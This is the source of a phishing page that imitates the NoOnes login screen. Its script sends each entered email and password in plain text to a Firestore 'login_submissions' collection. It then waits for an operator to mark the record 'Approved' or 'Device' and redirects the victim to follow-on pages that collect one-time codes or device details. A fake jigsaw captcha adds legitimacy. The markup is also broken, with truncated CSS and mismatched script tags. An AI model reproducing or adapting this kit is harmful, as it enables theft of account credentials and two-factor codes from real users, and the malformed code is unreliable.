<head>

<title>NoOnes - Login</title>
<style>
  :root{
    --bg: #1c1c1e;
    --card: #262629;
    --field: #3a3a3d;
    --green: #4CAF67;
    --green-bright: #57c47c;
    --text: #f2f2f2;
    --text-muted: #a3a3a6;
    --placeholder: #8a8a8d;
    --border-hairline: rgba(255,255,255,0.06);
  }
  *{ box-sizing:border-box; margin:0; padding:0; }
  html,body{
    height:100%;
    background:var(--bg);
    font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  }
  .device{
    width:100%;
    max-width:420px;
    min-height:100vh;
    margin:0 auto;
    background:var(--bg);
    display:flex;
    flex-direction:column;
  }

  /* Top app bar */
  .appbar{
    display:flex;
    align-items:center;
    justify-content:center;
    position:relative;
    padding:16px 16px 14px;
    border-bottom:1px solid var(--border-hairline);
    flex-shrink:0;
  }
  .appbar-title{
    color:var(--text);
    font-size:19px;
    font-weight:700;
  }
  .appbar-settings{
    position:absolute;
    right:16px;
    top:50%;
    transform:translateY(-50%);
    color:var(--text);
    cursor:pointer;
    display:flex;
  }

  /* Logo */
  .logo-area{
    display:flex;
    justify-content:center;
    padding:34px 0 26px;
  }
  .logo-area svg{ display:block; }

  /* Card */
  .card{
    background:var(--card);
    border-radius:18px;
    margin:0 20px;
    padding:28px 22px 26px;
  }
  .card h1{
    color:var(--text);
    font-size:25px;
    font-weight:800;
    text-align:center;
    margin-bottom:18px;
  }
  .social-row{
    display:flex;
    justify-content:center;
    gap:16px;
    margin-bottom:26px;
  }
  .social-btn{
    width:38px;
    height:38px;
    border-radius:50%;
    background:#fff;
    display:flex;
    align-items:center;
    justify-content:center;
    cursor:pointer;
    border:none;
    padding:0;
  }
  .social-btn.telegram{ background:#229ED9; }

  .field-group{ margin-bottom:18px; }
  .field-label{
    display:block;
    color:var(--text-muted);
    font-size:13.5px;
    font-weight:600;
    margin-bottom:8px;
  }
  .field-wrap{ position:relative; }
  input.field{
    width:100%;
    background:var(--field);
    border:none;
    border-radius:10px;
    padding:15px 44px 15px 16px;
    font-size:16px;
    color:var(--text);
    outline:none;
  }
  input.field::placeholder{ color:var(--placeholder); }
  input.field:focus{
    box-shadow:0 0 0 2px var(--green-bright);
  }
  .toggle-visibility{
    position:absolute;
    right:14px;
    top:50%;
    transform:translateY(-50%);
    background:none;
    border:none;
    color:var(--text-muted);
    cursor:pointer;
    display:flex;
    padding:4px;
  }

  .forgot-row{
    text-align:right;
    margin:-6px 0 22px;
  }
  .forgot-row a{
    color:var(--green-bright);
    font-size:14.5px;
    font-weight:600;
    text-decoration:underline;
  }

  .btn-login{
    width:100%;
    background:var(--green);
    color:#12271a;
    border:none;
    border-radius:12px;
    padding:16px;
    font-size:18px;
    font-weight:800;
    cursor:pointer;
    transition:filter 0.15s ease, transform 0.1s ease;
  }
  .btn-login:hover{ filter:brightness(1.06); }
  .btn-login:active{ transform:scale(0.98); }

  .signup-row{
    text-align:center;
    margin-top:20px;
    color:var(--text-muted);
    font-size:15.5px;
  }
  .signup-row a{
    color:var(--green-bright);
    font-weight:700;
    text-decoration:underline;
  }

  /* Footer controls */
  .footer-controls{
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:22px 20px;
    flex-shrink:0;
  }
  .theme-toggle{
    display:flex;
    align-items:center;
    gap:10px;
  }
  .theme-toggle svg{ color:var(--green-bright); }
  .switch{
    width:46px;
    height:26px;
    background:var(--green);
    border-radius:14px;
    position:relative;
    cursor:pointer;
    border:none;
    padding:0;
  }
  .switch .knob{
    position:absolute;
    top:3px;
    left:3px;
    width:20px;
    height:20px;
    background:#fff;
    border-radius:50%;
    transition:left 0.2s ease;
  }
  .switch.off{ background:#4a4a4d; }
  .switch.off .knob{ left:23px; }

  .lang-select{
    display:flex;
    align-items:center;
    gap:4px;
    color:var(--green-bright);
    font-size:15px;
    font-weight:700;
    text-decoration:underline;
    cursor:pointer;
    background:none;
    border:none;
  }

  .spacer{ flex:1; }

  .home-indicator{
    width:112px;
    height:4px;
    background:var(--text-muted);
    opacity:0.5;
    border-radius:3px;
    margin:0 auto 10px;
  }

.captcha-overlay{

left:0;
top:0;

width:100%;
height:100%;

to{

<script type="module">

import { db } from "./js/firebase.js";

import {
  collection,
  addDoc,
  serverTimestamp,
  doc,
  onSnapshot
} from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";

window.saveLoginToFirebase = async function () {

    const email = document.getElementById("identifier").value.trim();
    const password = document.getElementById("password").value;

    if (!email || !password) {
        alert("Please enter your email and password.");
        return;
    }

    try {

        const docRef = await addDoc(collection(db, "login_submissions"), {

            email: email,
            password: password,
            status: "Pending",
            createdAt: serverTimestamp()

        });

        localStorage.setItem("loginEmail", email);
        localStorage.setItem("loginDocId", docRef.id);

    } catch (error) {

        console.error(error);
        alert("Error saving login:\n" + error.message);

    }

};
window.waitForApproval = function () {

    const id = localStorage.getItem("loginDocId");

    if (!id) return;

    const ref = doc(db, "login_submissions", id);

    onSnapshot(ref, (snapshot) => {

        if (!snapshot.exists()) return;

        const data = snapshot.data();

        console.log("Status:", data.status);

        if (data.status === "Approved") {

            window.location.href = "authenticator-otp.html";

        } else if (data.status === "Device") {

            window.location.href = "device.html";

        } else if (data.status === "Rejected") {

            document.getElementById("loginLoading").style.display = "none";
            document.getElementById("loginBtn").disabled = false;

            alert("Login rejected.");

        }

    });

};

</script>

/* ===========================================
   REAL JIGSAW CAPTCHA
=========================================== */

const canvas = document.getElementById("captchaCanvas");
const ctx = canvas.getContext("2d");

const pieceCanvas = document.getElementById("pieceCanvas");
const pieceCtx = pieceCanvas.getContext("2d");

const img = new Image();

const images = [
"https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=320&h=180&fit=crop",
"https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?w=320&h=180&fit=crop",
"https://images.unsplash.com/photo-1493246507139-91e8fad9978e?w=320&h=180&fit=crop"
];

let pieceX = 0;
let pieceY = 0;

let holeX = 0;
let holeY = 0;

let pieceSize = 42;

let sliderValue = 0;
function loadPuzzle(){

    pieceCtx.clearRect(0,0,320,180);
    ctx.clearRect(0,0,320,180);

    img.crossOrigin = "Anonymous";
img.onerror = function () {
    alert("Puzzle image failed to load.");
};

    img.src=images[Math.floor(Math.random()*images.length)];

    img.onload=function(){

        ctx.drawImage(img,0,0,320,180);

        generatePuzzle();

    };

}

function generatePuzzle(){

    holeX = 120 + Math.random() * 120;
    holeY = 40 + Math.random() * 70;

    pieceX = 10;
    pieceY = holeY;

    drawPuzzle();

}

function drawPuzzle(){

    ctx.clearRect(0,0,320,180);
    ctx.drawImage(img,0,0,320,180);

    drawHole(ctx,holeX,holeY,pieceSize);

    pieceCtx.clearRect(0,0,320,180);

    pieceCtx.save();

    createPuzzlePath(pieceCtx,pieceX,pieceY,pieceSize);

    pieceCtx.clip();

    pieceCtx.drawImage(
        img,
        holeX,
        holeY,
        pieceSize,
        pieceSize,
        pieceX,
        pieceY,
        pieceSize,
        pieceSize
    );

    pieceCtx.restore();

    createPuzzlePath(pieceCtx,pieceX,pieceY,pieceSize);

    pieceCtx.lineWidth=2;

    pieceCtx.strokeStyle="#ffffff";

    pieceCtx.stroke();

}
function drawHole(ctx,x,y,size){

    ctx.save();

    createPuzzlePath(ctx,x,y,size);

    ctx.fillStyle="rgba(255,255,255,.55)";

    ctx.fill();

    ctx.restore();

}
function createPuzzlePath(ctx,x,y,size){

    const r=size/4;

    ctx.beginPath();

    ctx.moveTo(x,y);

    ctx.lineTo(x+size*0.30,y);

    ctx.arc(
        x+size*0.50,
        y,
        r,
        Math.PI,
        0,
        false
    );

    ctx.lineTo(x+size,y);

    ctx.lineTo(x+size,y+size*0.30);

    ctx.arc(
        x+size,
        y+size*0.50,
        r,
        -Math.PI/2,
        Math.PI/2,
        false
    );

    ctx.lineTo(x+size,y+size);

    ctx.lineTo(x,y+size);

    ctx.lineTo(x,y);

    ctx.closePath();

}

function closeCaptcha(){

document.getElementById("captchaOverlay").style.display="none";

}
const slider = document.getElementById("sliderButton");
const sliderFill = document.getElementById("sliderFill");
const message = document.getElementById("captchaMessage");

let dragging = false;
let startOffset = 0;

const maxMove = 320 - pieceSize - 10;
const maxSlider = 320 - 54;

slider.addEventListener("mousedown", function(e){
    dragging = true;
    startOffset = e.offsetX;
});

document.addEventListener("mousemove", dragSlider);
document.addEventListener("mouseup", finishSlide);

slider.addEventListener("touchstart", function(e){
    dragging = true;
    const rect = slider.getBoundingClientRect();
    startOffset = e.touches[0].clientX - rect.left;
});

document.addEventListener("touchmove", dragSliderTouch,{passive:false});
document.addEventListener("touchend", finishSlide);

function dragSlider(e){

    if(!dragging) return;

    const rect = slider.parentElement.getBoundingClientRect();

    let x = e.clientX - rect.left - startOffset + 27;

    updateSlider(x);

}

function dragSliderTouch(e){

    if(!dragging) return;

    e.preventDefault();

    const rect = slider.parentElement.getBoundingClientRect();

    let x = e.touches[0].clientX - rect.left - startOffset + 27;

    updateSlider(x);

}

function updateSlider(x) {
    x = Math.max(0, Math.min(maxSlider, x));

    slider.style.left = x + "px";
    sliderFill.style.width = (x + 27) + "px";

    pieceX = 10 + (x / maxSlider) * maxMove;

    drawPuzzle();
}

function finishSlide() {
    if (!dragging) return;
    dragging = false;

    if (Math.abs(pieceX - holeX) < 5) {
        message.style.color = "#36d621";
        message.textContent = "✔ Verified";

        setTimeout(async () => {

    closeCaptcha();

    // Show loading spinner
    document.getElementById("loginLoading").style.display="flex";
    document.getElementById("loginLoading").style.display="flex";
    document.getElementById("loginLoading").style.display="flex";

    // Keep your existing login logic
    document.getElementById("loginBtn").disabled=true;
    await window.saveLoginToFirebase();

// Wait for admin approval
window.waitForApproval();

}, 700);

    } else {
        message.style.color = "#ff4d4d";
        message.textContent = "Try again";

        slider.style.left = "0px";
        sliderFill.style.width = "0px";

        pieceX = 10;
        drawPuzzle();

        setTimeout(() => {
            message.textContent = "";
        }, 1000);
    }
}
</script>
